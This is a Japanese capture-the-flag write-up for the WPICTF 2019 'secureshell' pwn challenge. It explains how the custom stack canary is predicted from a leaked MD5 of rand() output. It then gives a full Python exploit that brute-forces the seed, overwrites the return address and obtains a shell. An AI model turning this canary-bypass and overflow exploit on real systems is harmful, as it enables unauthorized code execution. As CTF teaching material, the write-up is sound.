# [pwn 200pts] secureshell - WPICTF 2019
64ビットで基本的に無効です。
```
$ checksec -f secureshell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   89 Symbols     No	0		8	secureshell
```
IDAで解析しましょう。

入力した文字列とSECUREPASSWORDという環境変数に入っている文字列を比較して、合っていればshellがもらえます。
入力にバッファオーバーフローがあるのですが、独自実装のSSPで守られています。
```
$ SECUREPASSWORD=dummy ./secureshell 
Welcome to the Super dooper securer shell! Now with dynamic stack canaries and incident reporting!
Enter the password
AAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAav
LARRY THE CANARY IS DEAD
```

canaryは次のように生成されます。
```c
long canary = (rand() << 32) ^ rand();
```
また、`srand(秒 * 10^6 + マイクロ秒)`のように初期化されているのでrandの値を予測できません。
しかし、認証に失敗すると次のようにrandの値をもとにしたMD5値が出力されます。
```c
unsigned int x = rand();
MD5_CTX c;
MD5_Init(&c);
MD5_Update(&c, &x, sizeof(unsigned int));
MD5_Final(hash, &c);
```
これをもとにsrandへのシードを探索し、次のcanaryを計算できそうです。

```python
from ctypes import *
from ptrlib import *
from time import time
import hashlib

def find_canary(md5, seed):
    for x in range(seed - 0x50000, seed + 0x400000):
        libc.srand(x & 0xffffffff)
        libc.rand()
        libc.rand()
        if hashlib.md5(p32(libc.rand())).hexdigest() == md5:
            return p64((libc.rand() << 32) ^ libc.rand())
    return None

def get_seed():
    t = time()
    return (int(t) * 10**6 + int((t % 1) * 10**6)) & 0xffffffff

elf = ELF("./secureshell")
cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.27.so")
libc = CDLL("/lib/x86_64-linux-gnu/libc-2.27.so")

seed = get_seed()
sock = Process(["stdbuf", "-o0", "./secureshell"], env={"SECUREPASSWORD": "dummy"})

# find canary
sock.recvuntil("Enter the password\n")
sock.sendline("password123")
sock.recvuntil("Incident UUID: ")
uuid = bytes2str(sock.recvline().rstrip())
assert len(uuid) == 32
p1 = bytes.fromhex(uuid[:16])[::-1].hex()
p2 = bytes.fromhex(uuid[16:])[::-1].hex()
md5 = p1 + p2
canary = find_canary(md5, seed)
assert canary is not None
dump(b"canary = " + canary)

# overwrite
payload = b"A" * 0x70
payload += canary
payload += p64(0)
payload += p64(elf.symbol("shell"))
sock.recvuntil("Enter the password\n")
sock.sendline(payload)

# get the shell!
sock.interactive()
```

UUIDとMD5が違ったりhashのとり方間違えてたりでちょっと時間かけてしまった。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=14031)
[ptrlib] b'canary = \x19SR\x0b\xcd\x15\xaf\x11'
[ptrlib]$ whoami
ptr
```

# 感想
pythonからlibcのrandを呼び出す練習になりました。

# 参考文献
[1] [https://www.hackiit.cf/write-up-wpictf2019-secureshell/](https://www.hackiit.cf/write-up-wpictf2019-secureshell/)